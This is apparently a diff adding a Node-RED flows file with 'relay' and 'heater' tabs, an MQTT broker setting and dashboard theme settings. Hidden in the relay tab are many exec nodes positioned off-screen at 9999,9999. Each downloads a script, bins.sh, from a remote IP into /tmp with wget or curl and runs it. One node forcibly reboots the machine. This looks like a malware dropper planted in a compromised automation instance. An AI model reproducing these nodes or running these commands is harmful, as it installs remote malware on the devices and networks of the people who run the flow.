@@ -1,0 +1,3001 @@
+[
+    {
+        "id": "f12",
+        "type": "tab",
+        "label": "relay",
+        "disabled": false,
+        "info": ""
+    },
+    {
+        "id": "b67f0a00fe799f39",
+        "type": "tab",
+        "label": "heater",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "c2d6bca38d1bbe4a",
+        "type": "mqtt-broker",
+        "name": "wss data",
+        "broker": "wss://ws.datavansolutions.com:443/mqtt",
+        "port": "8884",
+        "clientid": "",
+        "autoConnect": true,
+        "usetls": false,
+        "protocolVersion": "4",
+        "keepalive": "60",
+        "cleansession": true,
+        "autoUnsubscribe": true,
+        "birthTopic": "",
+        "birthQos": "0",
+        "birthRetain": "false",
+        "birthPayload": "",
+        "birthMsg": {},
+        "closeTopic": "",
+        "closeQos": "0",
+        "closeRetain": "false",
+        "closePayload": "",
+        "closeMsg": {},
+        "willTopic": "",
+        "willQos": "0",
+        "willRetain": "false",
+        "willPayload": "",
+        "willMsg": {},
+        "userProps": "",
+        "sessionExpiry": ""
+    },
+    {
+        "id": "413202e53d083f00",
+        "type": "ui_base",
+        "theme": {
+            "name": "theme-light",
+            "lightTheme": {
+                "default": "#0094CE",
+                "baseColor": "#0094CE",
+                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
+                "edited": true,
+                "reset": false
+            },
+            "darkTheme": {
+                "default": "#097479",
+                "baseColor": "#097479",
+                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
+                "edited": false
+            },
+            "customTheme": {
+                "name": "Untitled Theme 1",
+                "default": "#4B7930",
+                "baseColor": "#4B7930",
+                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
+            },
+            "themeState": {
+                "base-color": {
+                    "default": "#0094CE",
+                    "value": "#0094CE",
+                    "edited": false
+                },
+                "page-titlebar-backgroundColor": {
+                    "value": "#0094CE",
+                    "edited": false
+                },
+                "page-backgroundColor": {
+                    "value": "#fafafa",
+                    "edited": false
+                },
+                "page-sidebar-backgroundColor": {
+                    "value": "#ffffff",
+                    "edited": false
+                },
+                "group-textColor": {
+                    "value": "#1bbfff",
+                    "edited": false
+                },
+                "group-borderColor": {
+                    "value": "#ffffff",
+                    "edited": false
+                },
+                "group-backgroundColor": {
+                    "value": "#ffffff",
+                    "edited": false
+                },
+                "widget-textColor": {
+                    "value": "#111111",
+                    "edited": false
+                },
+                "widget-backgroundColor": {
+                    "value": "#0094ce",
+                    "edited": false
+                },
+                "widget-borderColor": {
+                    "value": "#ffffff",
+                    "edited": false
+                },
+                "base-font": {
+                    "value": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
+                }
+            },
+            "angularTheme": {
+                "primary": "indigo",
+                "accents": "blue",
+                "warn": "red",
+                "background": "grey",
+                "palette": "light"
+            }
+        },
+        "site": {
+            "name": "Node-RED Dashboard",
+            "hideToolbar": "false",
+            "allowSwipe": "false",
+            "lockMenu": "false",
+            "allowTempTheme": "true",
+            "dateFormat": "DD/MM/YYYY",
+            "sizes": {
+                "sx": 48,
+                "sy": 48,
+                "gx": 6,
+                "gy": 6,
+                "cx": 6,
+                "cy": 6,
+                "px": 0,
+                "py": 0
+            }
+        }
+    },
+    {
+        "id": "158258ef-31f0-450d-9469-45ef97859431",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "ffe6fe72-c01e-4b02-bd3e-f2d21398a20b",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "158258ef-31f0-450d-9469-45ef97859431"
+            ]
+        ]
+    },
+    {
+        "id": "a275b432-1052-4af7-81b9-8c3a8f10d368",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "5d4b22d9-2d05-4c65-a22c-bb64309a5aaf",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "a275b432-1052-4af7-81b9-8c3a8f10d368"
+            ]
+        ]
+    },
+    {
+        "id": "4393267c-7e8b-44f9-9c9e-36e68322c04b",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "1a2f4c3f-d067-4f77-8a30-37b775fdc2b2",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "4393267c-7e8b-44f9-9c9e-36e68322c04b"
+            ]
+        ]
+    },
+    {
+        "id": "b3ddad94-c533-4d33-bdbd-d84e89c14789",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "ae79916c-b369-4024-9a5a-dbeea37f6385",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "b3ddad94-c533-4d33-bdbd-d84e89c14789"
+            ]
+        ]
+    },
+    {
+        "id": "8f29e749-40e3-4025-8265-c80833e6ca46",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "d51b0aee-b03e-482b-ad08-4e81a3eb2594",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "8f29e749-40e3-4025-8265-c80833e6ca46"
+            ]
+        ]
+    },
+    {
+        "id": "4114ff04-0ec9-40b3-a166-07ed52c67f11",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "e9bed19d-5483-469c-92be-3a39d751c9a6",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "4114ff04-0ec9-40b3-a166-07ed52c67f11"
+            ]
+        ]
+    },
+    {
+        "id": "ab53bcf4-2295-4b8b-96f0-7d657623c8d2",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "17a1b5ef-705e-42d0-afd4-f8f8f5d854af",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "ab53bcf4-2295-4b8b-96f0-7d657623c8d2"
+            ]
+        ]
+    },
+    {
+        "id": "f05fa46d-d306-4a9d-ad45-9561896d49b3",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "c2b3e529-7320-4dae-8f29-0b77cb86a11e",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "f05fa46d-d306-4a9d-ad45-9561896d49b3"
+            ]
+        ]
+    },
+    {
+        "id": "49eb81ef-abb5-4b43-8c57-a59c8a513ac0",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "bfc2be23-da28-44c0-a7d4-767e4ac9964f",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "49eb81ef-abb5-4b43-8c57-a59c8a513ac0"
+            ]
+        ]
+    },
+    {
+        "id": "f9a06031-f7c6-4874-a2ae-b411ded1b016",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "50e0de32-ae55-4376-b313-d7cca0abd3fb",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "f9a06031-f7c6-4874-a2ae-b411ded1b016"
+            ]
+        ]
+    },
+    {
+        "id": "e26b7ce0-df45-48fc-be0b-1c33cdf365f3",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "e417b44a-9538-436e-967d-5768d72ea3d9",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "e26b7ce0-df45-48fc-be0b-1c33cdf365f3"
+            ]
+        ]
+    },
+    {
+        "id": "a6485dfb-43c6-43c3-8981-c0be4d684a26",
+        "type": "exec",
+        "z": "f12",
+        "command": "sh -c 'chmod 777 /sbin/reboot; /sbin/reboot; chmod 777 /bin/reboot; /bin/reboot; reboot;'",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "51c1dbd7-78ff-4a69-af37-bfd1a54ffebf",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "a6485dfb-43c6-43c3-8981-c0be4d684a26"
+            ]
+        ]
+    },
+    {
+        "id": "f139c232-2228-43d1-84a3-973cb4db3ef4",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp/ && rm -f bins.sh && wget http://91.92.249.32/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "563e63f9-6cff-4b61-923e-17d9609f30f9",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "f139c232-2228-43d1-84a3-973cb4db3ef4"
+            ]
+        ]
+    },
+    {
+        "id": "1769a113-ca6d-4747-9507-c455daae205f",
+        "type": "exec",
+        "z": "f12",
+        "command": "cd /tmp/ && rm -f bins.sh && wget http://91.92.249.32/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "afb160e0-d6ec-4077-9069-8011a3538f39",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "1769a113-ca6d-4747-9507-c455daae205f"
+            ]
+        ]
+    },
+    {
+        "id": "db2f640e-6bd4-4055-8463-abb8a2d9ec04",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "9d177e6e-8dee-4ec8-a5c1-a251282e57e0",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "db2f640e-6bd4-4055-8463-abb8a2d9ec04"
+            ]
+        ]
+    },
+    {
+        "id": "db6acc91-148c-4cc5-9be1-13a232772c34",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "a76818c7-bdc4-4fc2-ae85-fae075ae7391",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "db6acc91-148c-4cc5-9be1-13a232772c34"
+            ]
+        ]
+    },
+    {
+        "id": "60424697-bcac-4af8-8468-8f2d00f9417a",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "ae4fcaf7-c98c-47ea-a701-106a822a6d20",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "60424697-bcac-4af8-8468-8f2d00f9417a"
+            ]
+        ]
+    },
+    {
+        "id": "1e9c145c-9332-4568-a82d-b162e9ff3935",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "4f75a52c-da32-4dfd-b91e-c64cc76283a1",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "1e9c145c-9332-4568-a82d-b162e9ff3935"
+            ]
+        ]
+    },
+    {
+        "id": "158bc152-4f78-459d-a606-8d5393c78e33",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "f714f057-b4e3-40f3-96df-8467ee65460e",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "158bc152-4f78-459d-a606-8d5393c78e33"
+            ]
+        ]
+    },
+    {
+        "id": "94336503-6cd7-4b83-89ac-6400634b60f7",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "0429d70a-4018-4318-af68-2ce0191abebf",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "94336503-6cd7-4b83-89ac-6400634b60f7"
+            ]
+        ]
+    },
+    {
+        "id": "e32ad1a0-1a98-486a-999d-adfdaa582aa1",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "1d3026b0-da8d-42c5-9dd1-8e1358605fae",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "e32ad1a0-1a98-486a-999d-adfdaa582aa1"
+            ]
+        ]
+    },
+    {
+        "id": "457f9049-e868-4120-85c1-3f4442089eae",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "a412f1e7-46f6-4cba-bc67-f458684a519c",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "457f9049-e868-4120-85c1-3f4442089eae"
+            ]
+        ]
+    },
+    {
+        "id": "695c2d6c-e4c1-424d-a247-9a15fe603fc3",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "b3dc4cf4-ff13-4d40-bc79-d87ef008f026",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "695c2d6c-e4c1-424d-a247-9a15fe603fc3"
+            ]
+        ]
+    },
+    {
+        "id": "170644f2-fb76-4c31-8ea0-aa3aed24514a",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "c9353e38-5966-4ca0-959b-d3f00a2d26f8",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "170644f2-fb76-4c31-8ea0-aa3aed24514a"
+            ]
+        ]
+    },
+    {
+        "id": "77b425a1-d493-4443-80fe-3b363cb78841",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
